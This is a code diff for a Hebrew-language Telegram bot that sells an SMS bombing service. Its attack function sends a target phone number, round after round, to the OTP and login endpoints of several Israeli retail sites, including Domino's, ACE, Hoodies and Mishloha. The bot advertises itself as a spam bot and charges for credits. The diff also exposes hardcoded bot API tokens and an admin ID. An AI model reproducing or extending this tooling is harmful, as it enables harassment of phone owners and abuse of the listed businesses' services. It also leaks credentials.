@@ -7,22 +7,22 @@ import os
 import uuid
 from datetime import datetime, timedelta
 
-# --- שרת Flask לשמירה על הבוט בחיים ---
+# --- שרת Flask ---
 app = Flask('')
 @app.route('/')
-def home(): return "<h1>Turbo Bot 11 Sites - Ready</h1>"
+def home(): return "<h1>Turbo Bot - Online</h1>"
 
 def keep_alive():
     t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
     t.start()
 
-# --- הגדרות בוט ומנהל ---
-# הטוקן המעודכן ששלחת עכשיו
-API_TOKEN = '8620606926:AAHt4U43py_KEDRwTwaqW35QqR_W6WFeEuY' 
-ADMIN_ID = 7265913946  # צור דביר
+# --- הגדרות בוט ---
+# הטוקן החדש ששלחת עכשיו
+API_TOKEN = '8620606926:AAFxqYIgZiHD9wT6I8KTNHQeI2md91URnjs'
+ADMIN_ID = 7265913946
 bot = telebot.TeleBot(API_TOKEN)
 
-user_data = {} 
+user_data = {}
 
 def get_user(uid):
     if uid not in user_data:
@@ -33,9 +33,8 @@ def attack(m, target, rounds):
     uid = m.from_user.id
     user = get_user(uid)
     
-    # רשימת כל 11 האתרים
     apis = [
-        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target, "addintinalInfo": ""}, "type": "form", "ref": "https://www.ace.co.il/"},
+        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
         {"n": "Dominos", "u": "https://api.dominos.co.il/sendOtp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
         {"n": "Hoodies", "u": "https://www.hoodies.co.il/customer/ajax/post/", "d": {"form_key": "HOnq3cnFQBxVH6HZ", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form", "ref": "https://www.hoodies.co.il/"},
         {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
@@ -78,9 +77,9 @@ def start(m):
         "👋 בוט הספאם המהיר של צור!\n\n"
         "👑 מנכ\"ל: @Tzur_Dvir\n"
         "💳 מחירון: 100 קרדיטים ב-10₪\n\n"
-        "💰 /me - יתרה ו-ID\n"
-        "🎁 /daily - מתנה יומית (10)\n"
-        "💸 /send [ID] [כמות] - העברה לחבר\n\n"
+        "💰 /me - יתרה\n"
+        "🎁 /daily - מתנה יומית\n"
+        "💸 /send [ID] [כמות] - העברה\n\n"
         "🚀 הפעלה: [סבבים] [טלפון]\n"
         "דוגמה: 3 0521234567"
     )
